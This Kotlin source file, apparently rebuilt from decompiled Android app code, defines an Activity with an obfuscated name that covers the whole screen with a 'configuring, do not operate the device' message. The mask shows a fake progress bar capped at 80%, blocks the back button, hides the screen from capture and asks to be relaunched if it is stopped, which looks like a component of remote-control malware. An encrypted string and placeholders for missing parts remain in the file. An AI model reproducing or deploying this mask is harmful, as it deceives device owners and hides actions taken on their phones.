package com.storm.safe.rock.activity

import android.app.Activity
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.graphics.Color
import android.graphics.ImageDecoder
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.WindowManager
import android.widget.FrameLayout
import android.widget.ImageView
import android.widget.LinearLayout
import android.widget.ProgressBar
import android.widget.TextView
import com.storm.safe.rock.util.StringUtil
import org.json.JSONObject
import java.io.IOException

/**
 * Full-screen config mask Activity — displays a loading/progress overlay
 * while device configuration is in progress.
 *
 * Reverse-engineered from JADX: activity/yojggfhv.java (366 lines).
 * Renamed: f51923b3→CONFIG_PREF_KEY, f51924a0→enabled, f51925a1→showProgress,
 *          f51926a2→titleText, f51927a3→subtitleText, f51928a4→textColor,
 *          f51929a5→subtitleColor, f51930a6→progressBar, f51931a7→percentText,
 *          f51932a8→handler, f51933a9→progressRunnable, f51934b0→startTime,
 *          f51935b1→startFromMax, f51936b2→hideReceiver, m211195a0→startProgress
 */
class yojggfhv : Activity() {

    companion object {
        private const val TAG = "yojggfhv"

        val CONFIG_PREF_KEY: String = StringUtil.decrypt("OFwDLEgqMy1YPy1QFnRHKwMg")

        private const val ACTION_HIDE = "com.storm.safe.rock.intent.HIDE_CONFIG_MASK"
        private const val ACTION_STOPPED = "com.storm.safe.rock.intent.CONFIG_MASK_STOPPED"

        /**
         * Hide the config mask by sending a broadcast.
         */
        @JvmStatic
        fun hideConfigMask(context: Context) {
            try {
                val intent = Intent(ACTION_HIDE)
                intent.setPackage(context.packageName)
                context.sendBroadcast(intent)
            } catch (e: Exception) {
                Log.e(TAG, "发送隐藏配置遮盖广播失败", e)
            }
        }

        /**
         * Show the config mask activity.
         */
        @JvmStatic
        @JvmOverloads
        fun showConfigMask(context: Context, customText: String? = null, startFromMax: Boolean = false) {
            try {
                val intent = Intent(context, yojggfhv::class.java)
                intent.addFlags(278921216) // NEW_TASK | CLEAR_TOP | NO_ANIMATION | etc.
                intent.putExtra("CONFIG_MASK_ID", System.currentTimeMillis())
                if (customText != null) {
                    intent.putExtra("CUSTOM_MASK_TEXT", customText)
                }
                intent.putExtra("START_FROM_MAX", startFromMax)
                context.startActivity(intent)
            } catch (e: Exception) {
                Log.e(TAG, "启动配置遮盖Activity失败", e)
            }
        }
    }

    var enabled: Boolean = false
    var showProgress: Boolean = true
    var titleText: String = "配置中请稍后..."
    var subtitleText: String = "正在自动配置和连接\n请勿操作设备"
    var textColor: String = "#FFFFFF"
    var subtitleColor: String = "#CCCCCC"
    var progressBar: ProgressBar? = null
    var percentText: TextView? = null
    var handler: Handler? = null
    var progressRunnable: Runnable? = null
    var startTime: Long = 0L
    var startFromMax: Boolean = false

    private val hideReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            if (intent?.action == ACTION_HIDE) {
                finish()
            }
        }
    }

    fun startProgress() {
        progressRunnable?.let { r ->
            handler?.removeCallbacks(r)
        }
        progressRunnable = null
        handler = null
        startTime = System.currentTimeMillis()
        val h = Handler(Looper.getMainLooper())
        handler = h

        if (!startFromMax) {
            // Animate progress from 0 to 80 over time
            val runnable = object : Runnable {
                override fun run() {
                    val elapsed = System.currentTimeMillis() - startTime
                    val progress = ((elapsed / 500) * 5).coerceAtMost(80).toInt()
                    progressBar?.visibility = android.view.View.VISIBLE
                    progressBar?.progress = progress
                    percentText?.text = "$progress%"
                    if (progress < 80) {
                        h.postDelayed(this, 500L)
                    }
                }
            }
            progressRunnable = runnable
            h.post(runnable)
        } else {
            progressBar?.visibility = android.view.View.VISIBLE
            progressBar?.progress = 80
            percentText?.text = "80%"
        }
    }

    @Throws(IOException::class)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Load config
        try {
            // ADAPT: full implementation needs AbstractC1408xb.m215154a0 (Step 2)
            // Fallback: read from regular SharedPreferences
            val prefs = getSharedPreferences("config_overlay", MODE_PRIVATE)
            enabled = prefs.getBoolean("enabled", true)
            showProgress = prefs.getBoolean("showProgress", true)
            titleText = prefs.getString("titleText", "配置中请稍后...") ?: "配置中请稍后..."
            subtitleText = prefs.getString("subtitleText", "正在自动配置和连接\n请勿操作设备") ?: "正在自动配置和连接\n请勿操作设备"
            textColor = prefs.getString("textColor", "#FFFFFF") ?: "#FFFFFF"
            subtitleColor = prefs.getString("subtitleColor", "#CCCCCC") ?: "#CCCCCC"
        } catch (_: Exception) {
            enabled = true
            showProgress = true
            titleText = "配置中请稍后..."
            subtitleText = "正在自动配置和连接\n请勿操作设备"
            textColor = "#FFFFFF"
            subtitleColor = "#CCCCCC"
        }

        // Apply custom text from intent
        intent?.getStringExtra("CUSTOM_MASK_TEXT")?.let { titleText = it }
        startFromMax = intent?.getBooleanExtra("START_FROM_MAX", false) ?: false

        if (!enabled) {
            finish()
            return
        }

        // Set fullscreen
        try {
            window.decorView.systemUiVisibility = 5894
            window.addFlags(6883200)
            window.addFlags(8192) // Segment.SIZE
            val attrs = window.attributes
            attrs.width = -1
            attrs.height = -1
            attrs.x = 0
            attrs.y = 0
            attrs.gravity = android.view.Gravity.START or android.view.Gravity.TOP
            if (Build.VERSION.SDK_INT >= 28) {
                attrs.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
            }
            window.attributes = attrs
        } catch (e: Exception) {
            Log.e(TAG, "设置全屏失败", e)
        }

        try {
            val frame = FrameLayout(this).apply {
                layoutParams = FrameLayout.LayoutParams(-1, -1)
                setBackgroundColor(Color.argb(80, 255, 0, 0))
            }

            // Background image attempt
            // ADAPT: depends on t60.m214706c7 for resource lookup
            window.setBackgroundDrawableResource(android.R.color.black)

            val textContainer = LinearLayout(this).apply {
                orientation = LinearLayout.VERTICAL
                gravity = android.view.Gravity.CENTER
                setPadding(48, 48, 48, 48)
                systemUiVisibility = 1792
            }

            val titleView = TextView(this).apply {
                text = titleText
                textSize = 28f
                try { setTextColor(Color.parseColor(textColor)) } catch (_: Exception) { setTextColor(Color.WHITE) }
                gravity = android.view.Gravity.CENTER
                setPadding(32, 32, 32, 32)
            }

            val subtitleView = TextView(this).apply {
                text = subtitleText
                textSize = 18f
                try { setTextColor(Color.parseColor(subtitleColor)) } catch (_: Exception) { setTextColor(Color.parseColor("#CCCCCC")) }
                gravity = android.view.Gravity.CENTER
                setPadding(16, 0, 16, 16)
            }

            textContainer.addView(titleView)
            textContainer.addView(subtitleView)

            if (showProgress) {
                val pb = ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal).apply {
                    max = 100
                    progress = 0
                    isIndeterminate = false
                }
                progressBar = pb

                val pctText = TextView(this).apply {
                    text = "0%"
                    textSize = 24f
                    setTextColor(Color.WHITE)
                    gravity = android.view.Gravity.CENTER
                    visibility = android.view.View.VISIBLE
                    val lp = LinearLayout.LayoutParams(-2, -2)
                    lp.setMargins(0, 8, 0, 16)
                    lp.gravity = android.view.Gravity.CENTER
                    layoutParams = lp
                }
                percentText = pctText

                textContainer.addView(pb)
                textContainer.addView(pctText)
                startProgress()
            } else {
                Log.w(TAG, "进度条功能已禁用")
            }

            frame.addView(textContainer, FrameLayout.LayoutParams(-1, -1))
            setContentView(frame)
        } catch (e: Exception) {
            Log.e(TAG, "创建遮盖界面失败", e)
        }

        // Register hide receiver
        try {
            val filter = IntentFilter(ACTION_HIDE)
            if (Build.VERSION.SDK_INT >= 33) {
                registerReceiver(hideReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
            } else {
                registerReceiver(hideReceiver, filter)
            }
        } catch (e: Exception) {
            Log.e(TAG, "注册广播接收器失败", e)
        }
    }

    override fun onDestroy() {
        try {
            progressRunnable?.let { r -> handler?.removeCallbacks(r) }
            progressRunnable = null
            handler = null
            unregisterReceiver(hideReceiver)
        } catch (e: Exception) {
            Log.e(TAG, "注销广播接收器失败", e)
        }
        super.onDestroy()
    }

    override fun onStop() {
        Log.w(TAG, "yojggfhv onStop - isFinishing: $isFinishing")
        super.onStop()
        if (!isFinishing) {
            Log.w(TAG, "yojggfhv被意外停止，通知ConfigMaskManager重新显示")
            sendBroadcast(Intent(ACTION_STOPPED))
        }
    }

    override fun onUserLeaveHint() {
        Handler(Looper.getMainLooper()).postDelayed({
            // ADAPT: depends on p000 callback runnable
        }, 500L)
    }

    override fun onBackPressed() {
        // Block back press
    }
}
